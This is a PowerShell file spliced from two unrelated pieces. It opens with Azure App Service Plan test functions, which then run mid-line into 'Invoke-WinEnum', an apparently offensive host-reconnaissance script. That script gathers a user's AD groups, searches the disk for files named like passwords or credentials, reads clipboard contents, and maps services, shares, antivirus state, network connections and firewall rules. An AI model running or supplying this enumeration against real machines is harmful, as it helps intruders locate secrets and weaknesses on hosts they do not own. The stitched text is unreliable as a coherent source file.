














function Test-CreateNewAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = Get-Location
	$capacity = 2
	$skuName = "S2"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location

		
		$job = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier "Standard" -WorkerSize Medium -NumberOfWorkers $capacity -AsJob
		$job | Wait-Job
		$createResult = $job | Receive-Job

		
		Assert-AreEqual $whpName $createResult.Name
		Assert-AreEqual "Standard" $createResult.Sku.Tier
		Assert-AreEqual $skuName $createResult.Sku.Name
		Assert-AreEqual $capacity $createResult.Sku.Capacity

		

		$getResult = Get-AzAppServicePlan -ResourceGroupName $rgname -Name $whpName
		Assert-AreEqual $whpName $getResult.Name
		Assert-AreEqual "Standard" $getResult.Sku.Tier
		Assert-AreEqual $skuName $getResult.Sku.Name
		Assert-AreEqual $capacity $getResult.Sku.Capacity
	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewAppServicePlanHyperV
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = Get-Location
    $capacity = 1
	$skuName = "PC2"
    $tier = "PremiumContainer"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location

		
		$job = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -WorkerSize Small -HyperV  -AsJob
		$job | Wait-Job
		$createResult = $job | Receive-Job

		
		Assert-AreEqual $whpName $createResult.Name
		Assert-AreEqual $tier $createResult.Sku.Tier
		Assert-AreEqual $skuName $createResult.Sku.Name
		Assert-AreEqual $capacity $createResult.Sku.Capacity

		

		$getResult = Get-AzAppServicePlan -ResourceGroupName $rgname -Name $whpName
		Assert-AreEqual $whpName $getResult.Name
		Assert-AreEqual PremiumContainer $getResult.Sku.Tier
		Assert-AreEqual $skuName $getResult.Sku.Name
		Assert-AreEqual $capacity $getResult.Sku.Capacity
        Assert-AreEqual $true $getResult.IsXenon
        Assert-AreEqual "windows" $getResult.Kind

	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}



function Test-SetAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = Get-Location
	$tier = "Shared"
	$skuName ="D1"
	$capacity = 0
	$perSiteScaling = $false;

	$newTier ="PremiumV2"
	$newSkuName = "P2v2"
	$newWorkerSize = "Medium"
	$newCapacity = 2
	$newPerSiteScaling = $true;


	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		
		$actual = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $tier -PerSiteScaling $perSiteScaling
		$result = Get-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName
		
		Assert-AreEqual $whpName $result.Name
		Assert-AreEqual $capacity $result.Sku.Capacity
		Assert-AreEqual $tier $result.Sku.Tier
		Assert-AreEqual $skuName $result.Sku.Name
		Assert-AreEqual $perSiteScaling $result.PerSiteScaling

		
		$job = Set-AzAppServicePlan  -ResourceGroupName $rgname -Name  $whpName -Tier $newTier -NumberofWorkers $newCapacity -WorkerSize $newWorkerSize -PerSiteScaling $newPerSiteScaling -AsJob
		$job | Wait-Job
		$newresult = $job | Receive-Job

		
		Assert-AreEqual $whpName $newresult.Name
		Assert-AreEqual $newCapacity $newresult.Sku.Capacity
		Assert-AreEqual $newTier $newresult.Sku.Tier
		Assert-AreEqual $newSkuName $newresult.Sku.Name
		Assert-AreEqual $newPerSiteScaling $newresult.PerSiteScaling

		
		$newresult.Sku.Capacity = $capacity
		$newresult.Sku.Tier = $tier
		$newresult.Sku.Name = $skuName
		$newresult.PerSiteScaling = $perSiteScaling

		$newresult | Set-AzAppServicePlan

		
		$newresult = Get-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName

		
		Assert-AreEqual $whpName $newresult.Name
		Assert-AreEqual $capacity $newresult.Sku.Capacity
		Assert-AreEqual $tier $newresult.Sku.Tier
		Assert-AreEqual $skuName $newresult.Sku.Name
		Assert-AreEqual $perSiteScaling $newresult.PerSiteScaling

	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-GetAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	$location1 = Get-Location
	$serverFarmName1 = Get-WebHostPlanName
	$tier1 = "Shared"
	$skuName1 ="D1"
	$capacity1 = 0

	$location2 = Get-SecondaryLocation
	$serverFarmName2 = Get-WebHostPlanName
	$tier2 ="Standard"
	$skuName2 = "S2"
	$workerSize2 = "Medium"
	$capacity2 = 2
	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location1
		$serverFarm1 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 -Location  $location1 -Tier $tier1
		
		
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name
		
		
		$serverFarm1 = Get-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 

		
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name

		
		$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName2 -Location  $location2 -Tier $tier2 -WorkerSize $workerSize2 -NumberofWorkers $capacity2
		
		
		Assert-AreEqual $serverFarmName2 $serverFarm2.Name
		Assert-AreEqual $capacity2 $serverFarm2.Sku.Capacity
		Assert-AreEqual $tier2 $serverFarm2.Sku.Tier
		Assert-AreEqual $skuName2 $serverFarm2.Sku.Name
		
		
		$result = Get-AzAppServicePlan -Name $serverFarmName1

		
		Assert-AreEqual 1 $result.Count
		$serverFarm1 = $result[0]
		Assert-AreEqual $serverFarmName1 $serverFarm1.Name
		Assert-AreEqual $capacity1 $serverFarm1.Sku.Capacity
		Assert-AreEqual $tier1 $serverFarm1.Sku.Tier
		Assert-AreEqual $skuName1 $serverFarm1.Sku.Name

		
		$result = Get-AzAppServicePlan

		
		Assert-True { $result.Count -ge 2 }

		
		$result = Get-AzAppServicePlan -Location $location1 | Select -expand Name 
		
		
		Assert-True { $result -contains $serverFarmName1 }
		Assert-False { $result -contains $serverFarmName2 }

		
		$result = Get-AzAppServicePlan -ResourceGroupName $rgname | Select -expand Name
		
		
		Assert-AreEqual 2 $result.Count
		Assert-True { $result -contains $serverFarmName1 }
		Assert-True { $result -contains $serverFarmName2 }

	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName1 -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName2 -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-RemoveAppServicePlan
{
	
	$rgname = Get-ResourceGroupName
	$serverFarmName = Get-WebHostPlanName
	$location = Get-Location
	$capacity = 0
	$skuName = "D1"
	$tier = "Shared"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location

		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $serverFarmName -Location  $location -Tier $tier
		
		
		Assert-AreEqual $serverFarmName $serverFarm.Name
		Assert-AreEqual $tier $serverFarm.Sku.Tier
		Assert-AreEqual $skuName $serverFarm.Sku.Name
		Assert-AreEqual $capacity $serverFarm.Sku.Capacity

		
		$serverFarm |Remove-AzAppServicePlan -Force -AsJob | Wait-Job
		
		$result = Get-AzAppServicePlan -ResourceGroupName $rgname

		Assert-AreEqual 0 $result.Count 
	}
	finally
	{
		
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewAppServicePlanInAse
{
	
	$rgname = Get-ResourceGroupName
	$whpName = Get-WebHostPlanName
	$location = "West US"
	$capacity = 1
	$skuName = "I1"
	$skuTier = "Isolated"
	$aseName = "asedemops"
	$aseResourceGroupName = "asedemorg"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location

		
		$createResult = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Location  $location -Tier $skuTier -WorkerSize Medium -NumberOfWorkers $capacity -AseName $aseName -AseResourceGroupName $aseResourceGroupName
		
		
		Assert-AreEqual $whpName $createResult.Name
		Assert-AreEqual "Isolated" $createResult.Sku.Tier
		Assert-AreEqual $skuName $createResult.Sku.Name

		
		$getResult = Get-AzAppServicePlan -ResourceGroupName $rgname -Name $whpName
		Assert-AreEqual $whpName $getResult.Name
		Assert-AreEqual "Isolated" $getResult.Sku.Tier
		Assert-AreEqual $skuName $getResult.Sku.Name
	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}function Invoke-WinEnum{

    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False,Position=0)]
        [string]$UserName,
        [Parameter(Mandatory=$False,Position=1)]
        [string[]]$keywords
    )


    Function Get-UserInfo{
        if($UserName){
            "UserName: $UserName`n"
            $DomainUser = $UserName  
        }
        else{
             
            $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $UserName = $DomainUser.split('\')[-1]
            "UserName: $UserName`n"
            
        }

        "`n-------------------------------------`n"
        "AD Group Memberships"
        "`n-------------------------------------`n"
        
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        
        $dsclass = "System.DirectoryServices.AccountManagement"
        $dsclassUP = "$dsclass.userprincipal" -as [type] 
        $iType = "SamAccountName"
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        
        $contextTypeDomain = New-object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain,$Domain.Name) 
        
        $cName = $Domain.GetDirectoryEntry().distinguishedName
        
        $usr = $dsclassUP::FindByIdentity($contextTypeDomain,$iType,$DomainUser)
        
        $usr.GetGroups() | foreach {$_.Name}
        
        
        
        "`n-------------------------------------`n"
        "Password Last changed"
        "`n-------------------------------------`n"

        $($usr.LastPasswordSet) + "`n"
            
        "`n-------------------------------------`n"
        "Last 5 files opened"
        "`n-------------------------------------`n"
            
        $AllOpenedFiles = Get-ChildItem -Path "C:\" -Recurse -Include @("*.txt","*.pdf","*.docx","*.doc","*.xls","*.ppt") -ea SilentlyContinue | Sort-Object {$_.LastAccessTime} 
        $LastOpenedFiles = @()
        $AllOpenedFiles | ForEach-Object {
            $owner = $($_.GetAccessControl()).Owner
            $owner = $owner.split('\')[-1]
            if($owner -eq $UserName){
                $LastOpenedFiles += $_
            }
        }
        if($LastOpenedFiles){
            $LastOpenedFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime -First 5 | Format-List | Out-String
        }
        
        "`n-------------------------------------`n"
        "Interesting Files"
        "`n-------------------------------------`n"
        
        $NewestInterestingFiles = @()
        if($keywords)
        {
            $AllInterestingFiles = Get-ChildItem -Path "C:\" -Recurse -Include $keywords -ea SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} | Sort-Object {$_.LastAccessTime}
            $AllInterestingFiles | ForEach-Object {
                $owner = $_.GetAccessControl().Owner
                $owner = $owner.split('\')[-1]
                if($owner -eq $UserName){
                    $NewestInterestingFiles += $_
                }
            } 
            if($NewestInterestingFiles){
                $NewestInterestingFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime | Format-List | Out-String
            }
        }
        else
        {
            $AllInterestingFiles = Get-ChildItem -Path "C:\" -Recurse -Include @("*.txt","*.pdf","*.docx","*.doc","*.xls","*.ppt","*pass*","*cred*") -ErrorAction SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} | Sort-Object {$_.LastAccessTime} 
            $AllInterestingFiles | ForEach-Object {
                $owner = $_.GetAccessControl().Owner
                $owner = $owner.split('\')[-1]
                if($owner -eq $UserName){
                    $NewestInterestingFiles += $_
                }
            }
            if($NewestInterestingFiles)
            {
                $NewestInterestingFiles | Sort-Object LastAccessTime -Descending | Select-Object FullName, LastAccessTime | Format-List | Out-String
            }
        }
        
        "`n-------------------------------------`n"
        "Clipboard Contents"
        "`n-------------------------------------`n"
        
        
        $cmd = {
            Add-Type -Assembly PresentationCore
            [Windows.Clipboard]::GetText() -replace "`r", '' -split "`n"  
        }
        if([threading.thread]::CurrentThread.GetApartmentState() -eq 'MTA'){
            & powershell -Sta -Command $cmd
        }
        else{
            $cmd
        }
        "`n"
    }
      
    Function Get-SysInfo{
        "`n-------------------------------------`n"
        "System Information"
        "`n-------------------------------------`n"
        
        $OSVersion = (Get-WmiObject -class Win32_OperatingSystem).Caption
        $OSArch = (Get-WmiObject -class win32_operatingsystem).OSArchitecture
        "OS: $OSVersion $OSArch`n"
        
        if($OSArch -eq '64-bit')
        {
            $registeredAppsx64 = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx86 = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx64 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
            $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
        }
        else
        {
            $registeredAppsx86 =  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredAppsx86 | Where-Object {$_.DisplayName -ne ' '} | Select-Object DisplayName | Format-Table -AutoSize | Out-String
        }

        "`n-------------------------------------`n"
        "Services"
        "`n-------------------------------------`n"

        $AllServices = @()
        Get-WmiObject -class win32_service | ForEach-Object{
            $service = New-Object PSObject -Property @{
                ServiceName = $_.DisplayName
                ServiceStatus = (Get-service | where-object { $_.DisplayName -eq $ServiceName}).status
                ServicePathtoExe = $_.PathName
                StartupType = $_.StartMode
            }
            $AllServices += $service  
        }

        $AllServices | Select ServicePathtoExe, ServiceName | Format-Table -AutoSize | Out-String

        "`n-------------------------------------`n"
        "Available Shares"
        "`n-------------------------------------`n"

        Get-WmiObject -class win32_share | Format-Table -AutoSize Name, Path, Description, Status | Out-String

        "`n-------------------------------------`n"
        "AV Solution"
        "`n-------------------------------------`n"

        $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct 
        if($AV){
            $AV.DisplayName + "`n"
            
            
            $AVstate = $AV.productState
            $statuscode = "{0:x6}" -f $AVstate
            $wscprovider = $statuscode[0,1]
            $wscscanner = $statuscode[2,3]
            $wscuptodate = $statuscode[4,5]
            $statuscode = -join $statuscode

            "AV Product State: " + $AV.productState + "`n"
            

            if($wscscanner -ge '10'){
                "Enabled: Yes`n"
            }
            elseif($wscscanner -eq '00' -or $wscscanner -eq '01'){
                "Enabled: No`n"
            }
            else{
                "Enabled: Unknown`n"
            }
            
            if($wscuptodate -eq '00'){
                "Updated: Yes`n"
            }
            elseif($wscuptodate -eq '10'){
                "Updated: No`n"
            }
            else{
                "Updated: Unknown`n"
            }
        }
        
        "`n-------------------------------------`n"
        "Windows Last Updated"
        "`n-------------------------------------`n"
        $Lastupdate = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object InstalledOn -First 1
        if($Lastupdate){
           $Lastupdate.InstalledOn | Out-String
           "`n"
        }
        else{
            "Unknown`n" 
        }    


    }

    
    Function Get-NetInfo{
        "`n-------------------------------------`n"
        "Network Adapters"
        "`n-------------------------------------`n"
        
        foreach ($Adapter in (Get-WmiObject -class win32_networkadapter -Filter "NetConnectionStatus='2'")){
            $config = Get-WmiObject -class win32_networkadapterconfiguration -Filter "Index = '$($Adapter.Index)'"
            "`n"
            "Adapter: " + $Adapter.Name + "`n"
            "`n"
            "IP Address: "
            if($config.IPAddress -is [system.array]){
                $config.IPAddress[0] + "`n"
            }
            else{
                $config.IPAddress + "`n"
            }
            "`n"
            "Mac Address: " + $Config.MacAddress
            "`n"
        }

        "`n-------------------------------------`n"
        "Netstat Established connections and processes"
        "`n-------------------------------------`n"
        

        $properties = 'Protocol','LocalAddress','LocalPort' 
        $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'

        netstat -ano | Select-String -Pattern '\s+(TCP|UDP)' | ForEach-Object {

            $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)

            if($item[1] -notmatch '^\[::') 
            {            
                if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $localAddress = $la.IPAddressToString 
                    $localPort = $item[1].split('\]:')[-1] 
                } 
                else 
                { 
                    $localAddress = $item[1].split(':')[0] 
                    $localPort = $item[1].split(':')[-1] 
                } 

                if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $remoteAddress = $ra.IPAddressToString 
                    $remotePort = $item[2].split('\]:')[-1] 
                } 
                else 
                { 
                    $remoteAddress = $item[2].split(':')[0] 
                    $remotePort = $item[2].split(':')[-1] 
                } 

                $netstat = New-Object PSObject -Property @{ 
                    PID = $item[-1] 
                    ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name 
                    Protocol = $item[0] 
                    LocalAddress = $localAddress 
                    LocalPort = $localPort 
                    RemoteAddress =$remoteAddress 
                    RemotePort = $remotePort 
                    State = if($item[0] -eq 'tcp') {$item[3]} else {$null} 
                }
                if($netstat.State -eq 'ESTABLISHED' ){
                    $netstat | Format-List ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Out-String | % { $_.Trim() }
                    "`n`n"
                }
            }
        }
    

        "`n-------------------------------------`n"
        "Mapped Network Drives"
        "`n-------------------------------------`n"

        Get-WmiObject -class win32_logicaldisk | where-object {$_.DeviceType -eq 4} | ForEach-Object{
            $NetPath = $_.ProviderName
            $DriveLetter = $_.DeviceID
            $DriveName = $_.VolumeName
            $NetworkDrive = New-Object PSObject -Property @{
                Path = $NetPath
                Drive = $DriveLetter
                Name = $DriveName
            }
            $NetworkDrive
        }


        "`n-------------------------------------`n"
        "Firewall Rules"
        "`n-------------------------------------`n"
        
        
        $fw = New-Object -ComObject HNetCfg.FwPolicy2 
        
        $FirewallRules = $fw.rules 
        
        $fwprofiletypes = @{1GB="All";1="Domain"; 2="Private" ; 4="Public"}
        $fwaction = @{1="Allow";0="Block"}
        $FwProtocols = @{1="ICMPv4";2="IGMP";6="TCP";17="UDP";41="IPV6";43="IPv6Route"; 44="IPv6Frag";
                  47="GRE"; 58="ICMPv6";59="IPv6NoNxt";60="IPv60pts";112="VRRP"; 113="PGM";115="L2TP"}
        $fwdirection = @{1="Inbound"; 2="Outbound"} 

        

        $fwprofiletype = $fwprofiletypes.Get_Item($fw.CurrentProfileTypes)
        $fwrules = $fw.rules

        "Current Firewall Profile Type in use: $fwprofiletype"
        $AllFWRules = @()
        
        $fwrules | ForEach-Object{
            
            $FirewallRule = New-Object PSObject -Property @{
                ApplicationName = $_.Name
                Protocol = $fwProtocols.Get_Item($_.Protocol)
                Direction = $fwdirection.Get_Item($_.Direction)
                Action = $fwaction.Get_Item($_.Action)
                LocalIP = $_.LocalAddresses
                LocalPort = $_.LocalPorts
                RemoteIP = $_.RemoteAddresses
                RemotePort = $_.RemotePorts
            }

            $AllFWRules += $FirewallRule

            
        } 
        $AllFWRules | Select-Object Action, Direction, RemoteIP, RemotePort, LocalPort, ApplicationName | Format-List | Out-String  
    }

    Get-UserInfo
    Get-SysInfo
    Get-NetInfo



}